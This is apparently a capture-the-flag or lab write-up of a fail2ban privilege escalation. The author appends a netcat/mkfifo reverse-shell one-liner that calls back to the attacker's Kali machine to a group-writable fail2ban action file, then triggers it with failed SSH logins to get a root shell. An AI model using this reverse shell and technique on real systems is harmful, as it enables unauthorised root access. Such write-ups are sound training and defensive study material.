#### -Ran "LunEnum.sh" script and found user "fox" is an owner of "fail2ban" group:

![](../Pasted%20Images/Pasted%20image%2020220525160309.png)

#### -Googled "fail2ban privilege escalation" and found the following webpage showing the steps to escalate privileges:

![](../Pasted%20Images/Pasted%20image%2020220525160438.png)

![](../Pasted%20Images/Pasted%20image%2020220525160505.png)

![](../Pasted%20Images/Pasted%20image%2020220525160515.png)

![](../Pasted%20Images/Pasted%20image%2020220525160523.png)

![](../Pasted%20Images/Pasted%20image%2020220525160536.png)

![](../Pasted%20Images/Pasted%20image%2020220525160549.png)

#Fail2BanPrivilegeEscalation

#### -Per steps above I navigated to "/etc/fail2ban/action.d" folder and typed "ls –la" and found group "fail2ban" has write priviliges on file "iptables-multiport-log.conf":

![](../Pasted%20Images/Pasted%20image%2020220525160617.png)

#### -Typed "vim iptables-multiport-log.conf" and typed "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc [my kali IP] >/tmp/f" to execute a reverse shell on port 85 (syntax found in www.revshells.com) towards the end of the file in vim

![](../Pasted%20Images/Pasted%20image%2020220525161311.png)

#### -Ran a "penelope" listener on kali machine listening on port 85

#### -Typed "ssh @fox192.168.236.126" and typed in random passwords just to make "fail2ban" block my IP found in the steps to escalate privileges on the aforementioned website and then received a root shell on my "penelope" listener: 

![](../Pasted%20Images/Pasted%20image%2020220525161405.png)
